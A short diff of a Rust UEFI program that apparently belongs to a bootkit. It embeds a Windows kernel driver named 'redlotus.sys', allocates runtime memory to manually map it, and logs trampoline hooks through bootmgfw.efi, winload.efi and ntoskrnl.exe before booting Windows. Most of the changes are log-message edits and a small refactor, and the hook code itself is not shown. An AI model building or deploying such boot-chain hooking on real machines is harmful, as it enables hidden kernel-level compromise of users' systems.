@@ -64,20 +64,20 @@ fn efi_main(image_handle: Handle, system_table: SystemTable<Boot>) -> Status {
     log::info!("[+] Image Loaded Successfully!");
 
     // Read Windows kernel driver from disk as bytes and data in global variable for later
-    let mut driver_bytes = include_bytes!("../../target/x86_64-pc-windows-msvc/debug/lol.sys").to_vec();
+    let mut driver_bytes = include_bytes!("../../target/x86_64-pc-windows-msvc/debug/redlotus.sys").to_vec();
     
-    log::info!("Driver Bytes Address: {:#p}", driver_bytes.as_mut_ptr());
-    log::info!("Driver Bytes Len: {:#x}", driver_bytes.len());
+    log::info!("[+] Driver Bytes Address: {:#p}", driver_bytes.as_mut_ptr());
+    log::info!("[+] Driver Bytes Len: {:#x}", driver_bytes.len());
 
     let nt_headers = unsafe { get_nt_headers(driver_bytes.as_mut_ptr()).unwrap() };
-    log::info!("Driver SizeOfImage: {:#x}", unsafe { (*nt_headers).OptionalHeader.SizeOfImage as u64 });
+    log::info!("[+] Driver SizeOfImage: {:#x}", unsafe { (*nt_headers).OptionalHeader.SizeOfImage as u64 });
     unsafe { DRIVER_IMAGE_SIZE = (*nt_headers).OptionalHeader.SizeOfImage as u64 };
 
     /* Allocates memory pages from the system for the Windows kernel driver to manually map */
     unsafe {
         DRIVER_PHYSICAL_MEMORY = boot_services.allocate_pages(AllocateType::AnyPages, MemoryType::RUNTIME_SERVICES_CODE, size_to_pages(driver_bytes.len()))
             .expect("Failed to allocate memory pages");
-        log::info!("Allocated memory pages for the driver at: {:#x}", DRIVER_PHYSICAL_MEMORY);
+        log::info!("[+] Allocated memory pages for the driver at: {:#x}", DRIVER_PHYSICAL_MEMORY);
     }
 
     // Copy driver
@@ -88,7 +88,7 @@ fn efi_main(image_handle: Handle, system_table: SystemTable<Boot>) -> Status {
     log::info!("[+] Trampoline hooks setup successfully! (bootmgfw.efi -> windload.efi -> ntoskrnl.exe)");
 
     /* Make the system pause for 10 seconds */
-    log::info!("Stalling the processor for 20 seconds");
+    log::info!("[+] Stalling the processor for 10 seconds");
     system_table.boot_services().stall(10_000_000);
 
     /* Start Windows EFI Boot Manager (bootmgfw.efi) */
@@ -98,11 +98,10 @@ fn efi_main(image_handle: Handle, system_table: SystemTable<Boot>) -> Status {
     Status::SUCCESS
 }
 
-pub const BASE_PAGE_SHIFT: usize = 12;
-
 /// Credits to tandasat: https://github.com/tandasat/Hypervisor-101-in-Rust/blob/5e7befc39b915c555f19e71bfb98ed9e8339eb51/hypervisor/src/main.rs#L196
 /// Computes how many pages are needed for the given bytes.
 fn size_to_pages(size: usize) -> usize {
+    const BASE_PAGE_SHIFT: usize = 12;
     const PAGE_MASK: usize = 0xfff;
 
     (size >> BASE_PAGE_SHIFT) + usize::from((size & PAGE_MASK) != 0)
